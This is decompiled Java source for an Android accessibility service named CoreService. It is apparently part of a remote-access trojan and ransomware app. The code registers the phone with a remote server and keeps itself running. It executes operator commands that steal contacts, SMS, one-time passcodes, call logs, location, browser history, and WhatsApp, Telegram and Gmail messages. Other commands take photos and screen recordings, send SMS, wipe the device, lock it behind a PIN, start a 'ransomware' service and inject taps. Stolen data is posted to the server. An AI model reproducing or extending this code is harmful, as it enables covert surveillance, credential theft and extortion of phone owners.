package com.love.app;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Path;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.LinkCapabilities;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.speech.tts.TextToSpeech;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import androidx.constraintlayout.core.motion.utils.TypedValues;
import androidx.core.view.accessibility.AccessibilityNodeInfoCompat;
import androidx.vectordrawable.graphics.drawable.PathInterpolatorCompat;
import androidx.work.WorkRequest;
import com.android.mms.service_alt.MmsHttpClient;
import com.android.mms.transaction.MessageSender;
import com.android.mms.transaction.TransactionBundle;
import com.android.volley.DefaultRetryPolicy;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.androidnetworking.common.ANConstants;
import com.github.tamir7.contacts.Contacts;
import com.google.android.gms.common.zzp;
import com.google.android.mms.smil.SmilHelper;
import com.google.gson.Gson;
import es.dmoral.toasty.Toasty;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import kotlinx.coroutines.DebugKt;
import me.everything.providers.android.browser.BrowserProvider;
import me.everything.providers.android.browser.Search;
import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.calllog.CallsProvider;
import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class CoreService extends AccessibilityService implements TextToSpeech.OnInitListener {
    private static final String GMAIL_PACKAGE = "com.google.android.gm";
    private static final long HEARTBEAT_INTERVAL = 15000;
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String PREF_NAME = "love_config";
    private static final String[] SETTINGS_PKGS = {"com.android.settings", "com.samsung.android.settings", "com.miui.securitycenter", "com.huawei.systemmanager", "com.coloros.safecenter", "com.vivo.permissionmanager", "com.oppo.safe", "com.zte.zdm", "com.htc.htcpowermanager", "com.google.android.settings", zzp.GOOGLE_PLAY_STORE_PACKAGE, "com.google.android.packageinstaller"};
    private static final String TAG = "CoreService";
    private static final String TELEGRAM_PACKAGE = "org.telegram.messenger";
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";
    private ComponentName adminComponent;
    private volatile Camera camera;
    private CameraManager cameraManager;
    private BroadcastReceiver cmdReceiver;
    private String deviceId;
    private DevicePolicyManager dpm;
    private AppConstant locationData;
    private LocationListener locationListener;
    private LocationManager locationManager;
    private RequestQueue requestQueue;
    private ScheduledExecutorService scheduler;
    private String torchCameraId;
    private TextToSpeech tts;
    private PowerManager.WakeLock wakeLock;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private boolean isLocked = false;
    private boolean registered = false;
    private final Object cameraLock = new Object();
    private boolean torchBlinking = false;
    private String currentCmdId = "";
    private InheritableThreadLocal<String> threadCmdId = new InheritableThreadLocal<>();
    private final AtomicBoolean isGmailFetching = new AtomicBoolean(false);
    private final AtomicBoolean isWhatsAppFetching = new AtomicBoolean(false);
    private final AtomicBoolean isTelegramFetching = new AtomicBoolean(false);

    private void startHeartbeat() {
    }

    private String getConfiguredLockPin() {
        String string = getSharedPreferences(PREF_NAME, 0).getString("lock_pin", "");
        return string == null ? "" : string.trim();
    }

    private boolean hasConfiguredLockPin() {
        return getConfiguredLockPin().matches("\\d{4,6}");
    }

    private void resetLockStateIfInvalid() {
        if (hasConfiguredLockPin()) {
            return;
        }
        this.isLocked = false;
        SharedPreferences.Editor editorEdit = getSharedPreferences(PREF_NAME, 0).edit();
        editorEdit.putBoolean("is_locked", false);
        editorEdit.apply();
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: CoreService dimulai");
        this.dpm = (DevicePolicyManager) getSystemService("device_policy");
        this.adminComponent = new ComponentName(this, (Class<?>) AdminReceiver.class);
        this.deviceId = getMyDeviceId();
        this.locationData = new AppConstant();
        this.tts = new TextToSpeech(this, this);
        this.requestQueue = Volley.newRequestQueue(this);
        CameraManager cameraManager = (CameraManager) getSystemService("camera");
        this.cameraManager = cameraManager;
        try {
            this.torchCameraId = cameraManager.getCameraIdList()[0];
        } catch (CameraAccessException e) {
            Log.w(TAG, "Tidak dapat mengakses kamera untuk torch: " + e.getMessage());
        }
        acquireWakeLock();
        startLocationTracking();
        ensureFgService();
        registerCmdReceiver();
        startHeartbeatService();
        startService(new Intent(this, (Class<?>) CommandService.class));
    }

    private String getMyDeviceId() {
        SharedPreferences sharedPreferences = getSharedPreferences(PREF_NAME, 0);
        String string = sharedPreferences.getString(KEY_DEVICE_ID, null);
        if (string == null) {
            string = Settings.Secure.getString(getContentResolver(), "android_id");
            if (string == null || string.isEmpty()) {
                string = "unknown_" + System.currentTimeMillis();
            }
            sharedPreferences.edit().putString(KEY_DEVICE_ID, string).apply();
        }
        return string;
    }

    private void acquireWakeLock() {
        try {
            PowerManager.WakeLock wakeLockNewWakeLock = ((PowerManager) getSystemService("power")).newWakeLock(1, "CoreService::WakeLock");
            this.wakeLock = wakeLockNewWakeLock;
            wakeLockNewWakeLock.acquire(86400000L);
        } catch (Exception e) {
            Log.e(TAG, "WakeLock error", e);
        }
    }

    private void ensureFgService() {
        Intent intent = new Intent(this, (Class<?>) ForegroundService.class);
        intent.putExtra("inputExtra", "System Service Running");
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Gagal ensureFgService: " + e.getMessage());
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "onServiceConnected: Layanan aksesibilitas terhubung");
        getSharedPreferences(PREF_NAME, 0).edit().putBoolean("core_running", true).apply();
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.flags = 89;
        accessibilityServiceInfo.feedbackType = 16;
        accessibilityServiceInfo.eventTypes = -1;
        setServiceInfo(accessibilityServiceInfo);
        this.isLocked = getSharedPreferences(PREF_NAME, 0).getBoolean("is_locked", false);
        resetLockStateIfInvalid();
        checkAccessibilityStatus();
    }

    private void checkAccessibilityStatus() {
        String string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
        if (string != null && string.contains(new StringBuilder().append(getPackageName()).append("/").append(getClass().getName()).toString())) {
            return;
        }
        Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
        intent.addFlags(268435456);
        startActivity(intent);
    }

    @Override // android.app.Service
    public void onDestroy() {
        LocationListener locationListener;
        Log.d(TAG, "onDestroy: CoreService dihentikan");
        getSharedPreferences(PREF_NAME, 0).edit().putBoolean("core_running", false).apply();
        this.registered = false;
        ScheduledExecutorService scheduledExecutorService = this.scheduler;
        if (scheduledExecutorService != null) {
            scheduledExecutorService.shutdown();
        }
        releaseCamera();
        LocationManager locationManager = this.locationManager;
        if (locationManager != null && (locationListener = this.locationListener) != null) {
            try {
                locationManager.removeUpdates(locationListener);
            } catch (Exception unused) {
            }
        }
        TextToSpeech textToSpeech = this.tts;
        if (textToSpeech != null) {
            textToSpeech.shutdown();
        }
        PowerManager.WakeLock wakeLock = this.wakeLock;
        if (wakeLock != null && wakeLock.isHeld()) {
            this.wakeLock.release();
        }
        try {
            BroadcastReceiver broadcastReceiver = this.cmdReceiver;
            if (broadcastReceiver != null) {
                unregisterReceiver(broadcastReceiver);
            }
        } catch (Exception unused2) {
        }
        super.onDestroy();
    }

    private void registerCmdReceiver() {
        this.cmdReceiver = new BroadcastReceiver() { // from class: com.love.app.CoreService.1
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context, Intent intent) {
                if ("com.love.app.UPDATE_LOCK_STATE".equals(intent.getAction())) {
                    CoreService.this.isLocked = intent.getBooleanExtra("is_locked", false);
                    return;
                }
                if ("com.love.app.EXECUTE_CMD".equals(intent.getAction())) {
                    int intExtra = intent.getIntExtra("cmd", -1);
                    String stringExtra = intent.getStringExtra("param");
                    String stringExtra2 = intent.getStringExtra("cmdId");
                    if (stringExtra2 == null || stringExtra2.isEmpty()) {
                        stringExtra2 = "broadcast_" + System.currentTimeMillis();
                    }
                    if (intExtra != -1) {
                        CoreService coreService = CoreService.this;
                        if (stringExtra == null) {
                            stringExtra = "";
                        }
                        coreService.executeCommand(intExtra, stringExtra, stringExtra2);
                    }
                }
            }
        };
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.love.app.EXECUTE_CMD");
        intentFilter.addAction("com.love.app.UPDATE_LOCK_STATE");
        registerReceiver(this.cmdReceiver, intentFilter);
    }

    private void startHeartbeatService() {
        ScheduledExecutorService scheduledExecutorService = this.scheduler;
        if (scheduledExecutorService == null || scheduledExecutorService.isShutdown()) {
            ScheduledExecutorService scheduledExecutorServiceNewSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor();
            this.scheduler = scheduledExecutorServiceNewSingleThreadScheduledExecutor;
            scheduledExecutorServiceNewSingleThreadScheduledExecutor.scheduleAtFixedRate(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda31
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m254lambda$startHeartbeatService$0$comloveappCoreService();
                }
            }, 10L, 15L, TimeUnit.SECONDS);
            this.scheduler.scheduleAtFixedRate(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda32
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m255lambda$startHeartbeatService$1$comloveappCoreService();
                }
            }, 30L, 60L, TimeUnit.SECONDS);
        }
    }

    /* JADX INFO: renamed from: lambda$startHeartbeatService$0$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m254lambda$startHeartbeatService$0$comloveappCoreService() {
        try {
            if (ForegroundService.isRunning()) {
                return;
            }
            Log.d(TAG, "ForegroundService mati, restarting...");
            ensureFgService();
        } catch (Exception e) {
            Log.e(TAG, "Local status check error", e);
        }
    }

    /* JADX INFO: renamed from: lambda$startHeartbeatService$1$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m255lambda$startHeartbeatService$1$comloveappCoreService() {
        try {
            if (!this.registered) {
                String baseUrl = ConfigFetcher.getBaseUrl(this);
                if (baseUrl == null || baseUrl.isEmpty()) {
                    return;
                }
                registerDevice(baseUrl);
                return;
            }
            String baseUrl2 = ConfigFetcher.getBaseUrl(this);
            if (baseUrl2 != null && !baseUrl2.isEmpty()) {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(KEY_DEVICE_ID, this.deviceId);
                jSONObject.put("username", ConfigFetcher.getUsername(this));
                jSONObject.put("session_id", ConfigFetcher.getSessionId(this));
                jSONObject.put("last_seen", System.currentTimeMillis());
                sendResult("heartbeat", "alive", "hb_" + System.currentTimeMillis());
            }
        } catch (Exception e) {
            Log.e(TAG, "Server heartbeat error", e);
        }
    }

    private void waitForBaseUrlAndRegister() {
        ConfigFetcher.bootstrapConfig(this, new ConfigFetcher.ConfigListener() { // from class: com.love.app.CoreService.2
            @Override // com.love.app.ConfigFetcher.ConfigListener
            public void onConfigLoaded(String str) {
                CoreService.this.registerDevice(str);
            }

            @Override // com.love.app.ConfigFetcher.ConfigListener
            public void onConfigFailed() {
                Log.w(CoreService.TAG, "baseUrl tidak ditemukan");
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void registerDevice(String str) {
        if (this.registered) {
            return;
        }
        JSONObject jSONObject = new JSONObject();
        try {
            jSONObject.put(KEY_DEVICE_ID, this.deviceId);
            jSONObject.put("model", Build.MODEL);
            jSONObject.put("manufacturer", Build.MANUFACTURER);
            jSONObject.put("sdk", Build.VERSION.SDK_INT);
            jSONObject.put("android", Build.VERSION.RELEASE);
            jSONObject.put("username", ConfigFetcher.getUsername(this));
            jSONObject.put("session_id", ConfigFetcher.getSessionId(this));
            jSONObject.put("lock_pin_set", hasConfiguredLockPin());
            jSONObject.put("lock_mode", getSharedPreferences(PREF_NAME, 0).getString("lock_mode", LinkCapabilities.Role.DEFAULT));
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
            if (telephonyManager != null) {
                try {
                    jSONObject.put("country", telephonyManager.getNetworkCountryIso());
                    jSONObject.put("operator", telephonyManager.getSimOperatorName());
                } catch (SecurityException unused) {
                    jSONObject.put("country", "");
                    jSONObject.put("operator", "");
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "register JSON error", e);
        }
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(1, str + "/register", jSONObject, new Response.Listener() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda9
            @Override // com.android.volley.Response.Listener
            public final void onResponse(Object obj) {
                this.f$0.m248lambda$registerDevice$2$comloveappCoreService((JSONObject) obj);
            }
        }, new Response.ErrorListener() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda10
            @Override // com.android.volley.Response.ErrorListener
            public final void onErrorResponse(VolleyError volleyError) {
                Log.w(CoreService.TAG, "Register HTTP gagal");
            }
        });
        jsonObjectRequest.setRetryPolicy(new DefaultRetryPolicy(15000, 1, 1.0f));
        this.requestQueue.add(jsonObjectRequest);
    }

    /* JADX INFO: renamed from: lambda$registerDevice$2$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m248lambda$registerDevice$2$comloveappCoreService(JSONObject jSONObject) {
        Log.d(TAG, "Registered OK via HTTP");
        String strOptString = jSONObject.optString("username", "");
        String strOptString2 = jSONObject.optString("session_id", "");
        if (!strOptString.trim().isEmpty()) {
            ConfigFetcher.setUsername(this, strOptString.trim());
        }
        if (!strOptString2.trim().isEmpty()) {
            ConfigFetcher.setSessionId(this, strOptString2.trim());
        }
        this.registered = true;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void executeCommand(int i, String str, String str2) {
        int i2;
        Log.d(TAG, "Menjalankan command: " + i + " cmdId=" + str2);
        this.currentCmdId = str2;
        this.threadCmdId.set(str2);
        switch (i) {
            case 1001:
                getContacts();
                return;
            case 1002:
                getSms();
                return;
            case 1003:
                sendSms(str);
                return;
            case 1004:
                getCallLogs();
                return;
            case Constant.CMD_GET_LOCATION /* 1005 */:
                sendLocation();
                return;
            case 1006:
                sendDeviceInfo();
                return;
            case 1007:
                getBrowserHistory();
                return;
            case 1008:
                vibrate();
                sendSimpleResult("vibrate", "done");
                return;
            case 1009:
                wipe();
                return;
            case 1010:
                startService(new Intent(this, (Class<?>) MyService.class));
                sendSimpleResult("ransomware", "started");
                return;
            case 1011:
                changeWallpaper(str);
                sendSimpleResult("wallpaper", "changed");
                return;
            case 1012:
                speak(str);
                sendSimpleResult("voice", "spoken");
                return;
            case 1013:
                showToast(str);
                sendSimpleResult("toast", "shown");
                return;
            case 1014:
                getFileList(str);
                return;
            case 1015:
                uploadFile(str);
                return;
            case 1016:
                setTorch(true);
                sendSimpleResult("torch", DebugKt.DEBUG_PROPERTY_VALUE_ON);
                return;
            case 1017:
                setTorch(false);
                this.torchBlinking = false;
                sendSimpleResult("torch", DebugKt.DEBUG_PROPERTY_VALUE_OFF);
                return;
            case 1018:
                startTorchBlink();
                sendSimpleResult("torch", "blink started");
                return;
            case 1019:
                fetchNotifications();
                return;
            case 1020:
                fetchGallery(str);
                return;
            default:
                switch (i) {
                    case Constant.CMD_GET_WHATSAPP_NUMBER /* 1050 */:
                        getWhatsAppNumber();
                        return;
                    case Constant.CMD_GET_OTP /* 1051 */:
                        getOTP();
                        return;
                    case Constant.CMD_GET_TELEGRAM /* 1052 */:
                        getTelegram();
                        return;
                    case Constant.CMD_GET_GOOGLE_ACCOUNTS /* 1053 */:
                        getGoogleAccounts();
                        return;
                    case Constant.CMD_GET_WHATSAPP_MESSAGES /* 1054 */:
                        m113xae12e8e4(str);
                        return;
                    case Constant.CMD_GET_TELEGRAM_MESSAGES /* 1055 */:
                        m114xafec3c03(str);
                        return;
                    default:
                        switch (i) {
                            case Constant.CMD_SCREENSHOT /* 1060 */:
                                startScreenCapture(ScreenCaptureService.ACTION_SCREENSHOT);
                                return;
                            case Constant.CMD_SCREEN_RECORD_START /* 1061 */:
                                startScreenCapture(ScreenCaptureService.ACTION_RECORD_START);
                                return;
                            case Constant.CMD_SCREEN_RECORD_STOP /* 1062 */:
                                Intent intent = new Intent(this, (Class<?>) ScreenCaptureService.class);
                                intent.putExtra(ScreenCaptureActivity.EXTRA_MODE, ScreenCaptureService.ACTION_RECORD_STOP);
                                intent.putExtra("cmd_id", str2);
                                startService(intent);
                                return;
                            default:
                                switch (i) {
                                    case Constant.CMD_SET_LOCK_MODE /* 2000 */:
                                        setLockMode(str);
                                        return;
                                    case Constant.CMD_GET_APPS /* 1596485 */:
                                        sendInstalledApps();
                                        return;
                                    case Constant.CMD_OVERLAY_SHOW /* 5698742 */:
                                        startService(new Intent(this, (Class<?>) ServiceWindow.class));
                                        sendSimpleResult("overlay", "shown");
                                        return;
                                    case Constant.CMD_HOME /* 25896321 */:
                                        performGlobalAction(2);
                                        sendSimpleResult("home", "done");
                                        return;
                                    case Constant.CMD_RECENTS /* 33654789 */:
                                        performGlobalAction(3);
                                        sendSimpleResult("recents", "done");
                                        return;
                                    case Constant.CMD_NOTIFICATIONS /* 45832158 */:
                                        performGlobalAction(4);
                                        sendSimpleResult("notifications", "done");
                                        return;
                                    case Constant.CMD_UNINSTALL /* 64645897 */:
                                        uninstallApp(str);
                                        return;
                                    case Constant.CMD_BACK /* 66985478 */:
                                        performGlobalAction(1);
                                        sendSimpleResult("back", "done");
                                        return;
                                    case Constant.CMD_LAUNCH_APP /* 74789654 */:
                                        launchApp(str);
                                        return;
                                    case Constant.CMD_SET_LOCK_PIN /* 87654321 */:
                                        if (setLockPin(str)) {
                                            sendSimpleResult("pin", "set");
                                            return;
                                        }
                                        return;
                                    case Constant.CMD_OVERLAY_HIDE /* 89521475 */:
                                        stopService(new Intent(this, (Class<?>) ServiceWindow.class));
                                        sendSimpleResult("overlay", "hidden");
                                        return;
                                    case Constant.CMD_LOCK_SCREEN /* 98765432 */:
                                        startLockActivity();
                                        return;
                                    case Constant.CMD_ENABLE_ADMIN /* 99887766 */:
                                        enableDeviceAdmin();
                                        sendSimpleResult("admin", "requested");
                                        return;
                                    default:
                                        switch (i) {
                                            case Constant.CMD_TAKE_PHOTO_BACK /* 11223344 */:
                                                takePhoto(0);
                                                return;
                                            case Constant.CMD_TAKE_PHOTO_FRONT /* 11223345 */:
                                                takePhoto(1);
                                                return;
                                            default:
                                                AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
                                                if (rootInActiveWindow == null) {
                                                    handleAccessibilityCommandWithFallback(i, str, str2);
                                                    return;
                                                }
                                                try {
                                                    if (i == 200) {
                                                        try {
                                                            i2 = Integer.parseInt(str);
                                                        } catch (NumberFormatException unused) {
                                                            i2 = 10;
                                                        }
                                                        fetchGmailEmails(i2);
                                                        break;
                                                    } else if (i == 115987) {
                                                        performTouch(str);
                                                    } else if (i == 44598715) {
                                                        performClick(rootInActiveWindow, str);
                                                    } else if (i == 885478962) {
                                                        setText(rootInActiveWindow, str);
                                                    } else {
                                                        Log.w(TAG, "Unknown cmd: " + i);
                                                        sendResult("error", "Unknown command", str2);
                                                    }
                                                } catch (Exception e) {
                                                    Log.e(TAG, "Error executing command " + i, e);
                                                    sendResult("error", e.getMessage(), str2);
                                                } finally {
                                                    try {
                                                        rootInActiveWindow.recycle();
                                                        break;
                                                    } catch (Exception unused2) {
                                                    }
                                                }
                                                try {
                                                    return;
                                                } catch (Exception unused3) {
                                                    return;
                                                }
                                        }
                                }
                        }
                }
        }
    }

    /* JADX INFO: renamed from: lambda$handleAccessibilityCommandWithFallback$4$com-love-app-CoreService */
    /* synthetic */ void m112xac3995c5() {
        fetchGmailEmails(10);
    }

    private void handleAccessibilityCommandWithFallback(int i, final String str, String str2) {
        if (i == 200) {
            launchAppAndWait(GMAIL_PACKAGE, new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda4
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m112xac3995c5();
                }
            });
            return;
        }
        if (i == 1054) {
            launchAppAndWait(WHATSAPP_PACKAGE, new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda5
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m113xae12e8e4(str);
                }
            });
        } else if (i == 1055) {
            launchAppAndWait(TELEGRAM_PACKAGE, new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda6
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m114xafec3c03(str);
                }
            });
        } else {
            sendResult("error", "No active window and no fallback", str2);
        }
    }

    private void launchAppAndWait(String str, final Runnable runnable) {
        final String str2 = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        Intent launchIntentForPackage = getPackageManager().getLaunchIntentForPackage(str);
        if (launchIntentForPackage == null) {
            sendResult("error", "Aplikasi " + str + " tidak terinstall", str2);
            return;
        }
        launchIntentForPackage.addFlags(268435456);
        startActivity(launchIntentForPackage);
        this.handler.postDelayed(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda36
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m244lambda$launchAppAndWait$7$comloveappCoreService(str2, runnable);
            }
        }, 2000L);
    }

    /* JADX INFO: renamed from: lambda$launchAppAndWait$7$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m244lambda$launchAppAndWait$7$comloveappCoreService(String str, Runnable runnable) {
        this.threadCmdId.set(str);
        if (getRootInActiveWindow() != null) {
            runnable.run();
        } else {
            sendResult("error", "Gagal membuka aplikasi", str);
        }
    }

    private void sendSimpleResult(String str, String str2) {
        sendResult(str, str2, this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId);
    }

    public void sendResult(final String str, final String str2, final String str3) {
        final String baseUrl = ConfigFetcher.getBaseUrl(this);
        if (baseUrl == null || baseUrl.isEmpty()) {
            return;
        }
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda15
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m251lambda$sendResult$8$comloveappCoreService(str3, str, str2, baseUrl);
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$sendResult$8$com-love-app-CoreService, reason: not valid java name */
    /* synthetic */ void m251lambda$sendResult$8$comloveappCoreService(String str, String str2, String str3, String str4) {
        boolean z = false;
        int i = 0;
        while (!z && i < 3) {
            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put(KEY_DEVICE_ID, this.deviceId);
                jSONObject.put("cmdId", str != null ? str : "");
                jSONObject.put(TransactionBundle.TRANSACTION_TYPE, str2);
                jSONObject.put(ScreenCaptureService.EXTRA_DATA, str3 != null ? str3 : "");
                jSONObject.put("timestamp", System.currentTimeMillis());
                byte[] bytes = jSONObject.toString().getBytes("UTF-8");
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str4 + "/result").openConnection();
                httpURLConnection.setRequestMethod(MmsHttpClient.METHOD_POST);
                httpURLConnection.setConnectTimeout(10000);
                httpURLConnection.setReadTimeout(10000);
                httpURLConnection.setRequestProperty(HttpHeaderParser.HEADER_CONTENT_TYPE, "application/json; charset=UTF-8");
                httpURLConnection.setDoOutput(true);
                DataOutputStream dataOutputStream = new DataOutputStream(httpURLConnection.getOutputStream());
                try {
                    dataOutputStream.write(bytes);
                    dataOutputStream.flush();
                    dataOutputStream.close();
                    int responseCode = httpURLConnection.getResponseCode();
                    if (responseCode == 200 || responseCode == 201) {
                        z = true;
                    } else {
                        i++;
                        Thread.sleep(i * Constant.CMD_SET_LOCK_MODE);
                    }
                    httpURLConnection.disconnect();
                } catch (Throwable th) {
                    try {
                        dataOutputStream.close();
                    } catch (Throwable th2) {
                        th.addSuppressed(th2);
                    }
                    throw th;
                }
            } catch (Exception unused) {
                i++;
                try {
                    Thread.sleep(i * PathInterpolatorCompat.MAX_NUM_POINTS);
                } catch (InterruptedException unused2) {
                }
            }
        }
    }

    private void sendResult(String str, String str2) {
        sendResult(str, str2, this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId);
    }

    private boolean setLockPin(String str) {
        String str2 = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        String strTrim = str == null ? "" : str.trim();
        if (!strTrim.matches("\\d{4,6}")) {
            sendResult("pin_error", "PIN harus 4-6 digit angka", str2);
            return false;
        }
        getSharedPreferences(PREF_NAME, 0).edit().putString("lock_pin", strTrim).apply();
        sendResult("lock_pin", "set", str2);
        return true;
    }

    private void startLockActivity() {
        String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        if (!hasConfiguredLockPin()) {
            this.isLocked = false;
            getSharedPreferences(PREF_NAME, 0).edit().putBoolean("is_locked", false).apply();
            sendResult("lock_error", "PIN belum diset", str);
        } else {
            this.isLocked = true;
            getSharedPreferences(PREF_NAME, 0).edit().putBoolean("is_locked", true).apply();
            Intent intent = new Intent(this, (Class<?>) LockActivity.class);
            intent.addFlags(335544320);
            startActivity(intent);
            sendResult("lock", "ok", str);
        }
    }

    private void startScreenCapture(String str) {
        String str2 = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        Intent intent = new Intent(this, (Class<?>) ScreenCaptureActivity.class);
        intent.addFlags(276824064);
        intent.putExtra(ScreenCaptureActivity.EXTRA_MODE, str);
        intent.putExtra("cmd_id", str2);
        startActivity(intent);
    }

    private byte[] compressImage(byte[] bArr, int i, int i2) {
        if (bArr == null) {
            return new byte[0];
        }
        try {
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inPreferredConfig = Bitmap.Config.RGB_565;
            Bitmap bitmapDecodeByteArray = BitmapFactory.decodeByteArray(bArr, 0, bArr.length, options);
            if (bitmapDecodeByteArray == null) {
                return bArr;
            }
            int width = bitmapDecodeByteArray.getWidth();
            int height = bitmapDecodeByteArray.getHeight();
            if (i2 > 0 && (width > i2 || height > i2)) {
                float f = i2;
                float f2 = width;
                float f3 = height;
                float fMin = Math.min(f / f2, f / f3);
                Bitmap bitmapCreateScaledBitmap = Bitmap.createScaledBitmap(bitmapDecodeByteArray, (int) (f2 * fMin), (int) (f3 * fMin), true);
                bitmapDecodeByteArray.recycle();
                bitmapDecodeByteArray = bitmapCreateScaledBitmap;
            }
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmapDecodeByteArray.compress(Bitmap.CompressFormat.JPEG, i, byteArrayOutputStream);
            bitmapDecodeByteArray.recycle();
            return byteArrayOutputStream.toByteArray();
        } catch (Exception | OutOfMemoryError e) {
            Log.w(TAG, "compressImage fallback: " + e.getMessage());
            return bArr;
        }
    }

    private void setLockMode(String str) {
        String str2 = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        String strSubstring = LinkCapabilities.Role.DEFAULT;
        String strSubstring2 = "";
        if (str == null || str.isEmpty()) {
            str = strSubstring;
        } else if (str.contains("&")) {
            for (String str3 : str.split("&")) {
                if (str3.startsWith("mode=")) {
                    strSubstring = str3.substring(5);
                } else if (str3.startsWith("url=")) {
                    strSubstring2 = str3.substring(4);
                }
            }
            str = strSubstring;
        }
        SharedPreferences.Editor editorEdit = getSharedPreferences(PREF_NAME, 0).edit();
        editorEdit.putString("lock_mode", str);
        if (!strSubstring2.isEmpty()) {
            if ("html".equals(str)) {
                editorEdit.putString("lock_html_url", strSubstring2);
            } else if ("chat".equals(str)) {
                editorEdit.putString("lock_chat_url", strSubstring2);
            }
        }
        editorEdit.apply();
        Intent intent = new Intent(this, (Class<?>) LockActivity.class);
        intent.addFlags(335544320);
        startActivity(intent);
        sendResult("lock_mode", "set to " + str, str2);
    }

    private void takePhoto(final int i) {
        final String str = this.threadCmdId.get() != null ? this.threadCmdId.get() : this.currentCmdId;
        new Thread(new Runnable() { // from class: com.love.app.CoreService$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m257lambda$takePhoto$10$comloveappCoreService(str, i);
            }
        }).start();
    }

